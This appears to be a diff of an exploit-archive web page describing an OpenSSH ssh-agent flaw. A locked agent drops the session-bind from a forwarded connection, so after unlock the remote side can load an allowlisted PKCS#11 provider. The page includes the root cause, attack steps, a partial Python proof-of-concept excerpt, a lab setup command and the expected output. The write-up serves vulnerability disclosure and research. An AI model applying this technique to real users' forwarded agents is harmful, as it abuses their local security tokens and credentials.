+        prose-pre:my-0 prose-pre:rounded-none prose-pre:bg-transparent prose-pre:p-0">
+<div class="overflow-x-auto">
+  <table>
+    
+    <thead>
+      
+      <tr>
+        
+        <th>Field</th>
+        
+        <th>Value</th>
+        
+      </tr>
+      
+    </thead>
+    
+    <tbody>
+      
+      <tr>
+        
+        <td><strong>Date Added</strong></td>
+        
+        <td>2026-07-12</td>
+        
+      </tr>
+      
+      <tr>
+        
+        <td><strong>Last Updated</strong></td>
+        
+        <td>2026-07-12</td>
+        
+      </tr>
+      
+      <tr>
+        
+        <td><strong>Author / Researcher</strong></td>
+        
+        <td>bikini (exploitarium)</td>
+        
+      </tr>
+      
+      <tr>
+        
+        <td><strong>CVE / Advisory</strong></td>
+        
+        <td>N/A</td>
+        
+      </tr>
+      
+      <tr>
+        
+        <td><strong>Category</strong></td>
+        
+        <td>network</td>
+        
+      </tr>
+      
+      <tr>
+        
+        <td><strong>Severity</strong></td>
+        
+        <td>High</td>
+        
+      </tr>
+      
+      <tr>
+        
+        <td><strong>CVSS Score</strong></td>
+        
+        <td>N/A (no official score published) — local-state-confusion bug reachable only through an established, agent-forwarded SSH session</td>
+        
+      </tr>
+      
+      <tr>
+        
+        <td><strong>Status</strong></td>
+        
+        <td>PoC — reproducible against a signed, checksum/signature-verified stock OpenSSH 10.4p1 build; no weaponized payload beyond starting an allowed PKCS#11 provider</td>
+        
+      </tr>
+      
+      <tr>
+        
+        <td><strong>Tags</strong></td>
+        
+        <td>openssh, ssh-agent, agent-forwarding, pkcs11, race-condition, state-confusion, no-cve, local-provider-abuse</td>
+        
+      </tr>
+      
+      <tr>
+        
+        <td><strong>Related</strong></td>
+        
+        <td>N/A</td>
+        
+      </tr>
+      
+    </tbody>
+  </table>
+</div></div>
+        </section><section class="space-y-3 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card">
+          <h2 id="affected-target" class="flex items-center gap-2 border-b border-zinc-200 pb-2 font-mono text-sm font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white">
+            <svg class="h-4 w-4 shrink-0 text-emerald-600 dark:text-brand" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><circle cx="12" cy="12" r="6"/><circle cx="12" cy="12" r="2"/></svg>
+
+            
+            Affected Target
+          </h2>
+          <div class="prose prose-sm prose-zinc max-w-none dark:prose-invert
+        prose-headings:font-mono prose-headings:tracking-tight
+        prose-a:text-emerald-600 dark:prose-a:text-emerald-400
+        prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
+        prose-code:before:content-[&#39;&#39;] prose-code:after:content-[&#39;&#39;]
+        prose-pre:my-0 prose-pre:rounded-none prose-pre:bg-transparent prose-pre:p-0">
+<div class="overflow-x-auto">
+  <table>
+    
+    <thead>
+      
+      <tr>
+        
+        <th>Field</th>
+        
+        <th>Value</th>
+        
+      </tr>
+      
+    </thead>
+    
+    <tbody>
+      
+      <tr>
+        
+        <td><strong>Software / System</strong></td>
+        
+        <td>OpenSSH portable — <code>ssh</code>, <code>sshd</code>, <code>ssh-agent</code></td>
+        
+      </tr>
+      
+      <tr>
+        
+        <td><strong>Versions Affected</strong></td>
+        
+        <td>Portable tags <code>V_9_3_P2</code> through <code>V_10_4_P1</code> (provider restriction logic present since 9.3p2; failed-session-bind tracking added in 9.6p1, still reachable behind the locked gate through 10.4p1)</td>
+        
+      </tr>
+      
+      <tr>
+        
+        <td><strong>Language / Platform</strong></td>
+        
+        <td>C, Linux (tested on Ubuntu 24.04.4 LTS x86-64 under WSL2)</td>
+        
+      </tr>
+      
+      <tr>
+        
+        <td><strong>Authentication Required</strong></td>
+        
+        <td>Yes — the attacker must be (or control) the remote SSH server/session the victim connects to with agent forwarding enabled</td>
+        
+      </tr>
+      
+      <tr>
+        
+        <td><strong>Network Access Required</strong></td>
+        
+        <td>Yes — requires an active <code>ssh -A</code> (agent-forwarded) connection between victim client and the attacker-influenced remote side</td>
+        
+      </tr>
+      
+    </tbody>
+  </table>
+</div></div>
+        </section><section class="space-y-3 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card">
+          <h2 id="summary" class="flex items-center gap-2 border-b border-zinc-200 pb-2 font-mono text-sm font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white">
+            <svg class="h-4 w-4 shrink-0 text-emerald-600 dark:text-brand" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>
+
+            
+            Summary
+          </h2>
+          <div class="prose prose-sm prose-zinc max-w-none dark:prose-invert
+        prose-headings:font-mono prose-headings:tracking-tight
+        prose-a:text-emerald-600 dark:prose-a:text-emerald-400
+        prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
+        prose-code:before:content-[&#39;&#39;] prose-code:after:content-[&#39;&#39;]
+        prose-pre:my-0 prose-pre:rounded-none prose-pre:bg-transparent prose-pre:p-0">
+<p>OpenSSH&rsquo;s <code>ssh-agent</code> supports being locked with a password, during which it is supposed to refuse essentially all requests — including the <code>session-bind@openssh.com</code> extension that a forwarded agent connection uses to record which remote session it belongs to. The bug is a state-tracking gap: when the agent is locked, extension requests (including session-bind) are rejected at a global locked-check <em>before</em> the agent ever records that the bind was attempted or failed. The SSH client, meanwhile, still creates the forwarded agent channel even though the bind was refused. Once the agent is later unlocked through a separate, legitimate local connection, the persistent forwarded socket has no record of ever having attempted (and failed) a session bind — so the classification function <code>socket_is_remote()</code> incorrectly treats it as a local connection. A request on that forwarded socket to add a PKCS#11 provider (<code>SSH_AGENTC_ADD_SMARTCARD_KEY</code>) is then processed as if it came from a trusted local caller, bypassing the remote-provider restriction that OpenSSH added specifically to stop forwarded/remote agent connections from loading arbitrary PKCS#11 modules.</p></div>
+        </section><section class="space-y-3 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card">
+          <h2 id="vulnerability-details" class="flex items-center gap-2 border-b border-zinc-200 pb-2 font-mono text-sm font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white">
+            <svg class="h-4 w-4 shrink-0 text-emerald-600 dark:text-brand" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+
+            
+            Vulnerability Details
+          </h2>
+          <div class="prose prose-sm prose-zinc max-w-none dark:prose-invert
+        prose-headings:font-mono prose-headings:tracking-tight
+        prose-a:text-emerald-600 dark:prose-a:text-emerald-400
+        prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
+        prose-code:before:content-[&#39;&#39;] prose-code:after:content-[&#39;&#39;]
+        prose-pre:my-0 prose-pre:rounded-none prose-pre:bg-transparent prose-pre:p-0">
+<h3 id="root-cause">Root Cause</h3>
+<p>The flaw spans OpenSSH&rsquo;s client and agent:</p>
+<ol>
+<li><code>clientloop.c</code>&rsquo;s <code>client_request_agent()</code> creates a forwarded agent channel even when <code>ssh_agent_bind_hostkey()</code> reports the session bind was refused.</li>
+<li><code>ssh-agent.c</code>&rsquo;s <code>process_message()</code> applies a global &ldquo;locked&rdquo; check <em>before</em> its main request dispatcher — while locked, every extension request (including <code>session-bind@openssh.com</code>) is discarded before <code>process_extension()</code> can even parse which extension it was.</li>
+<li>Because the bind request never reaches <code>process_ext_session_bind()</code>, the <code>session_bind_attempted</code> marker is never set for that forwarded socket.</li>
+<li>After a separate, legitimate local connection unlocks the agent, <code>socket_is_remote()</code> finds neither a recorded session identifier nor a failed-bind marker on the forwarded socket, so it (incorrectly) classifies it as local.</li>
+<li><code>process_add_smartcard_key()</code> — which is supposed to reject provider-add requests from remote/forwarded sockets — evaluates its remote-socket check as false and forwards the request to <code>pkcs11_add_provider()</code>, which starts <code>ssh-pkcs11-helper</code> and loads the specified PKCS#11 module.</li>
+</ol>
+<p>The same flawed classification is also consulted by the external-security-key provider path (<code>process_add_identity()</code>), not just the smartcard path.</p>
+<h3 id="attack-vector">Attack Vector</h3>
+<ol>
+<li>Victim connects with <code>ssh -A</code> (agent forwarding) to a server the attacker controls or has compromised, while their local <code>ssh-agent</code> happens to be locked.</li>
+<li>The malicious/compromised server side (or a process on it) holds the forwarded <code>SSH_AUTH_SOCK</code> connection open. The locked agent refuses the <code>session-bind@openssh.com</code> extension, but the SSH client still creates the forwarded agent channel regardless.</li>
+<li>At some later point the victim unlocks their local agent through an unrelated, legitimate local action.</li>
+<li>The attacker-influenced remote side sends <code>SSH_AGENTC_ADD_SMARTCARD_KEY</code> over the still-open forwarded socket, specifying a PKCS#11 module path that&rsquo;s on the local provider allowlist.</li>
+<li>Because the forwarded socket was never marked as having attempted (and failed) a session bind, the agent treats the request as local and initializes the specified provider — something that should be restricted to genuinely local callers.</li>
+</ol>
+<h3 id="impact">Impact</h3>
+<p>A remote party the victim connects to with agent forwarding enabled can cause the victim&rsquo;s local <code>ssh-agent</code> to load and initialize a PKCS#11 provider module of the attacker&rsquo;s choosing (constrained to whatever&rsquo;s on the local provider allowlist) without the provider-restriction check that OpenSSH specifically added to prevent forwarded/remote connections from doing this. Depending on what provider modules are permitted/present on the victim&rsquo;s system, this could be leveraged to interact with security tokens or trigger provider-specific behavior the victim did not intend to expose to a remote party.</p></div>
+        </section><section class="space-y-3 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card">
+          <h2 id="environment-/-lab-setup" class="flex items-center gap-2 border-b border-zinc-200 pb-2 font-mono text-sm font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white">
+            <svg class="h-4 w-4 shrink-0 text-emerald-600 dark:text-brand" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
+
+            
+            Environment / Lab Setup
+          </h2>
+          <div class="prose prose-sm prose-zinc max-w-none dark:prose-invert
+        prose-headings:font-mono prose-headings:tracking-tight
+        prose-a:text-emerald-600 dark:prose-a:text-emerald-400
+        prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
+        prose-code:before:content-[&#39;&#39;] prose-code:after:content-[&#39;&#39;]
+        prose-pre:my-0 prose-pre:rounded-none prose-pre:bg-transparent prose-pre:p-0">
+<div class="poc-code group/code my-4 overflow-hidden rounded border border-zinc-200 dark:border-mono-border">
+  <div class="flex items-center justify-between border-b border-zinc-200 bg-zinc-50 px-3 py-1.5 font-mono text-[11px] text-zinc-500 dark:border-mono-border dark:bg-mono-bg dark:text-mono-muted">
+    <span>Output</span>
+    <button type="button" class="code-copy transition hover:text-emerald-600 dark:hover:text-brand" aria-label="Copy code to clipboard">Copy</button>
+  </div>
+  <div class="poc-code-body overflow-x-auto bg-white dark:bg-[#05080a]"><pre class="px-3 py-2 font-mono text-[11px] leading-normal text-zinc-700 dark:text-slate-300"><code>Target:      Stock, unmodified OpenSSH portable 10.4p1 (release archive checksum
              and GPG signature verified against the official OpenSSH release key
              7168 B983 815A 5EEF 59A4 ADFD 2A3F 414E 7360 60BA)
 Platform:    Ubuntu 24.04.4 LTS x86-64 (tested under WSL2), OpenSSL 3.0.13
 Attacker:    Python 3, standard library only (raw ssh-agent protocol socket I/O)
 Tools:       A stock OpenSSH install (ssh, sshd, ssh-agent, ssh-keygen) under one
              prefix; a PKCS#11 module on the agent&#39;s provider allowlist
-             (p11-kit-trust.so used in the original replay)</code></pre></div></div><h3 id=setup-steps>Setup Steps</h3><div class="poc-code group/code my-4 overflow-hidden rounded border border-zinc-200 dark:border-mono-border"><div class="flex items-center justify-between border-b border-zinc-200 bg-zinc-50 px-3 py-1.5 font-mono text-[11px] text-zinc-500 dark:border-mono-border dark:bg-mono-bg dark:text-mono-muted"><span>Shell script</span>
-<button type=button class="code-copy transition hover:text-emerald-600 dark:hover:text-brand" aria-label="Copy code to clipboard">Copy</button></div><div class="poc-code-body overflow-x-auto bg-white dark:bg-[#05080a]"><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>OPENSSH_PREFIX</span><span class=o>=</span>/opt/openssh-10.4p1 bash run.sh</span></span></code></pre></td></tr></table></div></div></div></div></div></section><section class="space-y-3 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card"><h2 id=proof-of-concept class="flex items-center gap-2 border-b border-zinc-200 pb-2 font-mono text-sm font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white"><svg class="h-4 w-4 shrink-0 text-emerald-600 dark:text-brand" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
-Proof of Concept</h2><div class="prose prose-sm prose-zinc max-w-none dark:prose-invert
-prose-headings:font-mono prose-headings:tracking-tight
-prose-a:text-emerald-600 dark:prose-a:text-emerald-400
-prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
-prose-code:before:content-[''] prose-code:after:content-['']
-prose-pre:my-0 prose-pre:rounded-none prose-pre:bg-transparent prose-pre:p-0"><blockquote><p>See <code>poc.py</code>, <code>run.sh</code>, and <code>evidence/stock-openssh-10.4p1.txt</code> in this folder — mirrored from <a href=https://github.com/bikini/exploitarium/tree/main/openssh-agent-lock-provider-bypass>bikini/exploitarium</a>. Verified before ingestion: <code>poc.py</code> is pure Python standard library implementing the raw ssh-agent wire protocol (length-prefixed request/response, agent lock/unlock, <code>SSH_AGENTC_ADD_SMARTCARD_KEY</code>) — no obfuscation, no unrelated network calls. <code>run.sh</code> builds an entirely local, loopback-only lab (temporary Ed25519 keys, isolated <code>sshd</code>/<code>ssh-agent</code> instances, no external targets) and its cleanup trap removes all spawned processes and temp files. The included evidence file&rsquo;s runner output and diagnostic log excerpts match the README&rsquo;s documented reproduction exactly.</p></blockquote><h3 id=step-by-step-reproduction>Step-by-Step Reproduction</h3><p><code>run.sh</code> automates the full sequence:</p><ol><li>Generate temporary Ed25519 host and client keys.</li><li>Start an isolated <code>ssh-agent</code> on a private Unix socket.</li><li>Start a loopback-only <code>sshd</code> with public-key auth and agent forwarding enabled.</li><li>Lock the agent (<code>poc.py control lock</code>).</li><li>Connect with <code>ssh -A</code> and run <code>poc.py probe</code> as the &ldquo;remote&rdquo; process, holding the forwarded agent socket open.</li><li>Unlock the agent through a separate local connection (<code>poc.py control unlock</code>).</li><li>Send <code>SSH_AGENTC_ADD_SMARTCARD_KEY</code> over the still-open forwarded socket.</li><li>Verify via client/agent debug logs that the bind was refused while locked, the forwarded channel was still created, and the provider was nonetheless loaded and initialized post-unlock.</li></ol><h3 id=exploit-code>Exploit Code</h3><div class="poc-code group/code my-4 overflow-hidden rounded border border-zinc-200 dark:border-mono-border"><div class="flex items-center justify-between border-b border-zinc-200 bg-zinc-50 px-3 py-1.5 font-mono text-[11px] text-zinc-500 dark:border-mono-border dark:bg-mono-bg dark:text-mono-muted"><span>Python</span>
-<button type=button class="code-copy transition hover:text-emerald-600 dark:hover:text-brand" aria-label="Copy code to clipboard">Copy</button></div><div class="poc-code-body overflow-x-auto bg-white dark:bg-[#05080a]"><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
-</span><span class=lnt> 2
-</span><span class=lnt> 3
-</span><span class=lnt> 4
-</span><span class=lnt> 5
-</span><span class=lnt> 6
-</span><span class=lnt> 7
-</span><span class=lnt> 8
-</span><span class=lnt> 9
-</span><span class=lnt>10
-</span><span class=lnt>11
-</span><span class=lnt>12
-</span><span class=lnt>13
-</span><span class=lnt>14
-</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>LOCK</span> <span class=o>=</span> <span class=mi>22</span>
-</span></span><span class=line><span class=cl><span class=n>UNLOCK</span> <span class=o>=</span> <span class=mi>23</span>
-</span></span><span class=line><span class=cl><span class=n>ADD_SMARTCARD_KEY</span> <span class=o>=</span> <span class=mi>20</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>request</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=n>body</span><span class=p>):</span>
-</span></span><span class=line><span class=cl>    <span class=n>sock</span><span class=o>.</span><span class=n>sendall</span><span class=p>(</span><span class=n>struct</span><span class=o>.</span><span class=n>pack</span><span class=p>(</span><span class=s2>&#34;&gt;I&#34;</span><span class=p>,</span> <span class=nb>len</span><span class=p>(</span><span class=n>body</span><span class=p>))</span> <span class=o>+</span> <span class=n>body</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>    <span class=n>length</span> <span class=o>=</span> <span class=n>struct</span><span class=o>.</span><span class=n>unpack</span><span class=p>(</span><span class=s2>&#34;&gt;I&#34;</span><span class=p>,</span> <span class=n>recv_exact</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=mi>4</span><span class=p>))[</span><span class=mi>0</span><span class=p>]</span>
-</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>recv_exact</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=n>length</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>probe</span><span class=p>(</span><span class=n>args</span><span class=p>):</span>
-</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=n>connect</span><span class=p>(</span><span class=n>os</span><span class=o>.</span><span class=n>environ</span><span class=p>[</span><span class=s2>&#34;SSH_AUTH_SOCK&#34;</span><span class=p>])</span> <span class=k>as</span> <span class=n>sock</span><span class=p>:</span>
-</span></span><span class=line><span class=cl>        <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>hold</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>        <span class=n>body</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>([</span><span class=n>ADD_SMARTCARD_KEY</span><span class=p>])</span> <span class=o>+</span> <span class=n>ssh_string</span><span class=p>(</span><span class=n>args</span><span class=o>.</span><span class=n>provider</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span> <span class=o>+</span> <span class=n>ssh_string</span><span class=p>(</span><span class=sa>b</span><span class=s2>&#34;&#34;</span><span class=p>)</span>
-</span></span><span class=line><span class=cl>        <span class=n>reply</span> <span class=o>=</span> <span class=n>request</span><span class=p>(</span><span class=n>sock</span><span class=p>,</span> <span class=n>body</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div></div></div><h3 id=expected-output>Expected Output</h3><div class="poc-code group/code my-4 overflow-hidden rounded border border-zinc-200 dark:border-mono-border"><div class="flex items-center justify-between border-b border-zinc-200 bg-zinc-50 px-3 py-1.5 font-mono text-[11px] text-zinc-500 dark:border-mono-border dark:bg-mono-bg dark:text-mono-muted"><span>Output</span>
-<button type=button class="code-copy transition hover:text-emerald-600 dark:hover:text-brand" aria-label="Copy code to clipboard">Copy</button></div><div class="poc-code-body overflow-x-auto bg-white dark:bg-[#05080a]"><pre class="px-3 py-2 font-mono text-[11px] leading-normal text-zinc-700 dark:text-slate-300"><code>lock_reply_type=6
+             (p11-kit-trust.so used in the original replay)</code></pre>
+  </div>
+</div>
+<h3 id="setup-steps">Setup Steps</h3>
+<div class="poc-code group/code my-4 overflow-hidden rounded border border-zinc-200 dark:border-mono-border">
+  <div class="flex items-center justify-between border-b border-zinc-200 bg-zinc-50 px-3 py-1.5 font-mono text-[11px] text-zinc-500 dark:border-mono-border dark:bg-mono-bg dark:text-mono-muted">
+    <span>Shell script</span>
+    <button type="button" class="code-copy transition hover:text-emerald-600 dark:hover:text-brand" aria-label="Copy code to clipboard">Copy</button>
+  </div>
+  <div class="poc-code-body overflow-x-auto bg-white dark:bg-[#05080a]"><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">OPENSSH_PREFIX</span><span class="o">=</span>/opt/openssh-10.4p1 bash run.sh</span></span></code></pre></td></tr></table>
+</div>
+</div>
+  </div>
+</div></div>
+        </section><section class="space-y-3 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card">
+          <h2 id="proof-of-concept" class="flex items-center gap-2 border-b border-zinc-200 pb-2 font-mono text-sm font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white">
+            <svg class="h-4 w-4 shrink-0 text-emerald-600 dark:text-brand" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
+
+            
+            Proof of Concept
+          </h2>
+          <div class="prose prose-sm prose-zinc max-w-none dark:prose-invert
+        prose-headings:font-mono prose-headings:tracking-tight
+        prose-a:text-emerald-600 dark:prose-a:text-emerald-400
+        prose-code:font-mono prose-code:text-emerald-600 dark:prose-code:text-emerald-400
+        prose-code:before:content-[&#39;&#39;] prose-code:after:content-[&#39;&#39;]
+        prose-pre:my-0 prose-pre:rounded-none prose-pre:bg-transparent prose-pre:p-0">
+<blockquote>
+<p>See <code>poc.py</code>, <code>run.sh</code>, and <code>evidence/stock-openssh-10.4p1.txt</code> in this folder — mirrored from <a href="https://github.com/bikini/exploitarium/tree/main/openssh-agent-lock-provider-bypass">bikini/exploitarium</a>. Verified before ingestion: <code>poc.py</code> is pure Python standard library implementing the raw ssh-agent wire protocol (length-prefixed request/response, agent lock/unlock, <code>SSH_AGENTC_ADD_SMARTCARD_KEY</code>) — no obfuscation, no unrelated network calls. <code>run.sh</code> builds an entirely local, loopback-only lab (temporary Ed25519 keys, isolated <code>sshd</code>/<code>ssh-agent</code> instances, no external targets) and its cleanup trap removes all spawned processes and temp files. The included evidence file&rsquo;s runner output and diagnostic log excerpts match the README&rsquo;s documented reproduction exactly.</p></blockquote>
+<h3 id="step-by-step-reproduction">Step-by-Step Reproduction</h3>
+<p><code>run.sh</code> automates the full sequence:</p>
+<ol>
+<li>Generate temporary Ed25519 host and client keys.</li>
+<li>Start an isolated <code>ssh-agent</code> on a private Unix socket.</li>
+<li>Start a loopback-only <code>sshd</code> with public-key auth and agent forwarding enabled.</li>
+<li>Lock the agent (<code>poc.py control lock</code>).</li>
+<li>Connect with <code>ssh -A</code> and run <code>poc.py probe</code> as the &ldquo;remote&rdquo; process, holding the forwarded agent socket open.</li>
+<li>Unlock the agent through a separate local connection (<code>poc.py control unlock</code>).</li>
+<li>Send <code>SSH_AGENTC_ADD_SMARTCARD_KEY</code> over the still-open forwarded socket.</li>
+<li>Verify via client/agent debug logs that the bind was refused while locked, the forwarded channel was still created, and the provider was nonetheless loaded and initialized post-unlock.</li>
+</ol>
+<h3 id="exploit-code">Exploit Code</h3>
+<div class="poc-code group/code my-4 overflow-hidden rounded border border-zinc-200 dark:border-mono-border">
+  <div class="flex items-center justify-between border-b border-zinc-200 bg-zinc-50 px-3 py-1.5 font-mono text-[11px] text-zinc-500 dark:border-mono-border dark:bg-mono-bg dark:text-mono-muted">
+    <span>Python</span>
+    <button type="button" class="code-copy transition hover:text-emerald-600 dark:hover:text-brand" aria-label="Copy code to clipboard">Copy</button>
+  </div>
+  <div class="poc-code-body overflow-x-auto bg-white dark:bg-[#05080a]"><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">LOCK</span> <span class="o">=</span> <span class="mi">22</span>
+</span></span><span class="line"><span class="cl"><span class="n">UNLOCK</span> <span class="o">=</span> <span class="mi">23</span>
+</span></span><span class="line"><span class="cl"><span class="n">ADD_SMARTCARD_KEY</span> <span class="o">=</span> <span class="mi">20</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">request</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">body</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sock</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&gt;I&#34;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">body</span><span class="p">))</span> <span class="o">+</span> <span class="n">body</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">length</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&#34;&gt;I&#34;</span><span class="p">,</span> <span class="n">recv_exact</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="mi">4</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">recv_exact</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">length</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">probe</span><span class="p">(</span><span class="n">args</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">connect</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s2">&#34;SSH_AUTH_SOCK&#34;</span><span class="p">])</span> <span class="k">as</span> <span class="n">sock</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">hold</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">body</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">([</span><span class="n">ADD_SMARTCARD_KEY</span><span class="p">])</span> <span class="o">+</span> <span class="n">ssh_string</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">provider</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span> <span class="o">+</span> <span class="n">ssh_string</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">reply</span> <span class="o">=</span> <span class="n">request</span><span class="p">(</span><span class="n">sock</span><span class="p">,</span> <span class="n">body</span><span class="p">)</span></span></span></code></pre></td></tr></table>
+</div>
+</div>
+  </div>
+</div>
+<h3 id="expected-output">Expected Output</h3>
+<div class="poc-code group/code my-4 overflow-hidden rounded border border-zinc-200 dark:border-mono-border">
+  <div class="flex items-center justify-between border-b border-zinc-200 bg-zinc-50 px-3 py-1.5 font-mono text-[11px] text-zinc-500 dark:border-mono-border dark:bg-mono-bg dark:text-mono-muted">
+    <span>Output</span>
+    <button type="button" class="code-copy transition hover:text-emerald-600 dark:hover:text-brand" aria-label="Copy code to clipboard">Copy</button>
+  </div>
+  <div class="poc-code-body overflow-x-auto bg-white dark:bg-[#05080a]"><pre class="px-3 py-2 font-mono text-[11px] leading-normal text-zinc-700 dark:text-slate-300"><code>lock_reply_type=6
 unlock_reply_type=6
 forwarded_socket_connected=true
 provider_reply_type=5
@@ -116,220 +785,534 @@ session_bind_refused_while_locked=true
 forwarded_channel_opened=true
 provider_helper_started=true
 provider_initialized=true
-reproduced=true</code></pre></div></div></div></section><section class="space-y-3 rounded-lg border border-zinc-200 bg-white p-4 dark:border-mono-border dark:bg-mono-card"><h2 id=detection-amp-indicators-of-compromise class="flex items-center gap-2 border-b border-zinc-200 pb-2 font-mono text-sm font-bold uppercase tracking-wider text-zinc-900 dark:border-mono-border dark:text-white"><svg class="h-4 w-4 shrink-0 text-emerald-600 dark:text-brand" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.3-4.3"/></svg>
-Detection & Indicators of Compromise</h2><div class="prose prose-sm prose-zinc max-w-none dark:prose-invert
-prose-headings:font-mono prose-headings:tracking-tight
